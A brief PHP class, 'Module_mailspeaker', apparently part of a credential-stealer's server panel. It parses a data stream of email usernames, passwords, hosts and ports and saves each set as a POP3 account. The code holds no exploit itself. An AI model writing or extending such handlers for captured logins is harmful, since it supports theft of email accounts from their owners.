<?php
class Module_mailspeaker extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
				$stream = new Stream($Data, strlen($Data));

				while(TRUE)
				{
					$User = $stream->getSTRING_();
					if($User == NULL)
						break;
					
					//$User 	= $stream->getSTRING_();
					$Pass	= $stream->getSTRING_();
					$Host 	= $stream->getSTRING_();
					$Port	= $stream->getSTRING_();
					
					$this->add_email($User, "pop3", $Host, $Port, $User, $Pass);
				}
				
				$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

